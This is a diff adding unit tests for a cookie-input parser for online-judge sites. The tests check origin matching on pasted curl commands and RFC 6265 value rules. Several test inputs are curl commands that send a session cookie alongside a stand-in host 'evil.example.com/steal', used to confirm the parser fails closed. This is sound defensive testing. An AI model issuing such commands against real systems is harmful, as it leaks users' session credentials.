@@ -68,13 +68,43 @@ describe('parseOjCookieInput', () => {
     const multiRes = parseOjCookieInput(multiUrl, 'codeforces', undefined, fixedNow)!;
     expect(multiRes.originStatus).toBe('mismatched');
     expect(multiRes.normalizedHeader).toBe('');
+
+    // Scheme-less second positional host MUST NOT be ignored
+    const schemelessSecond = `curl 'https://qoj.ac/' 'evil.example.com/steal' -H 'Cookie: UOJSESSID=abc'`;
+    const schemelessRes = parseOjCookieInput(schemelessSecond, 'qoj', undefined, fixedNow)!;
+    expect(schemelessRes.originStatus).toBe('mismatched');
+    expect(schemelessRes.normalizedHeader).toBe('');
+
+    // Known value-taking option such as --doh-url pointing elsewhere does NOT poison request origin
+    const dohCurl = `curl --doh-url 'https://dns.google/dns-query' 'https://qoj.ac/contest/1' -H 'Cookie: UOJSESSID=qoj_ok'`;
+    const dohRes = parseOjCookieInput(dohCurl, 'qoj', undefined, fixedNow)!;
+    expect(dohRes.originStatus).toBe('matched');
+    expect(dohRes.normalizedHeader).toBe('UOJSESSID=qoj_ok');
+
+    // Unknown flag arity fails closed rather than returning matched
+    const unknownFlagCurl = `curl --unknown-flag 'https://evil.example.com' 'https://qoj.ac/' -H 'Cookie: UOJSESSID=qoj_ok'`;
+    const unknownFlagRes = parseOjCookieInput(unknownFlagCurl, 'qoj', undefined, fixedNow)!;
+    expect(unknownFlagRes.originStatus).toBe('mismatched');
+    expect(unknownFlagRes.normalizedHeader).toBe('');
   });
 
-  it('marks bare Cookie header as unknown origin and enforces strict RFC 6265 cookie-value grammar', () => {
+  it('marks bare Cookie header as unknown origin, preserves Netscape empty values, and rejects NBSP / invalid RFC 6265 values', () => {
     const res = parseOjCookieInput('Cookie: JSESSIONID="vj_99"; foo=bar', 'vjudge', undefined, fixedNow)!;
     expect(res.format).toBe('header');
     expect(res.originStatus).toBe('unknown');
     expect(res.normalizedHeader).toBe('JSESSIONID="vj_99"; foo=bar');
+
+    // Non-breaking space (\u00A0) immediately after '=' MUST be rejected, not silently trimmed
+    const nbsp = parseOjCookieInput('JSESSIONID=\u00A0abc', 'codeforces', undefined, fixedNow)!;
+    expect(nbsp.normalizedHeader).toBe('');
+    expect(nbsp.rejectedCount).toBe(1);
+
+    // Netscape row with a valid empty cookie value on the last line MUST be preserved (trailing tab intact)
+    const emptyNetscape = '# Netscape HTTP Cookie File\ncodeforces.com\tFALSE\t/\tTRUE\t1900000000\tEMPTY\t';
+    const emptyRes = parseOjCookieInput(emptyNetscape, 'codeforces', undefined, fixedNow)!;
+    expect(emptyRes.format).toBe('netscape');
+    expect(emptyRes.keys).toEqual(['EMPTY']);
+    expect(emptyRes.normalizedHeader).toBe('EMPTY=');
 
     // Multiline raw header must be rejected rather than converting newlines into `;`
     const multiline = parseOjCookieInput('JSESSIONID=a\nfoo=b', 'codeforces', undefined, fixedNow)!;
